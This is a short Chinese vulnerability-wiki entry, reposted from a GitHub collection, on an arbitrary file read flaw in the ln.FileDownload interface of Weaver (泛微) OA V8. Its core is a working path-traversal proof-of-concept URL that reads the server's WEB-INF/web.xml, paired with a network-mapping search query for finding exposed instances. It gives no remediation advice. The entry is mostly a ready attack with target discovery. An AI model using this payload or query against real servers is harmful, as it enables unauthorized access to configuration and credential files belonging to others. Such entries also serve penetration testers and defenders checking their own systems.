---
title: "泛微OA ln.FileDownload 任意文件读取漏洞"
date: 2026-10-17 09:12:45
categories:
  - WebSecurity
  - CVE
  - "OA"
  - "泛微OA"
tags:
  - "泛微OA"
  - "任意文件读取"
  - "漏洞复现"
---
## 漏洞描述

泛微OA ln.FileDownload 接口存在任意文件读取漏洞，攻击者通过漏洞可以获取服务器任意文件

## 漏洞影响

```
泛微OA V8
```

## 网络测绘

```
app="泛微-协同办公OA"
```

## 漏洞复现

登陆页面

![image-20220520141045902](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/oa/images/202205201410983.png)

验证POC

```
/weaver/ln.FileDownload?fpath=../ecology/WEB-INF/web.xml
```

![image-20220520141058500](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/oa/images/202205201410567.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/oa/%E6%B3%9B%E5%BE%AEOA-ln.FileDownload-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md)
